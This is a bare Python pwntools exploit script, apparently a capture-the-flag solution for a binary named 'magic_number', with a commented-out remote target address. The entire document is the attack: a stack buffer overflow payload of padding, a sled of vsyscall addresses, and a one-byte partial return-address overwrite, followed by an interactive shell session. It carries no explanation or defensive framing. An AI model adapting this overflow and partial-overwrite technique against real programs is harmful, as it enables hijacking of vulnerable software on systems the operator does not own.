#!/usr/bin/python
#coding:utf-8
from pwn import *
context.log_level = 'debug'
p=process('magic_number')
#p=remote('183.129.189.60',10010)
elf=ELF('magic_number')
sleep(5)

payload = 'B'*0x38+p64(0xFFFFFFFFFF600400)*4+'\xA8'
#gdb.attach(p)
p.send(payload)
#pause()
p.interactive()

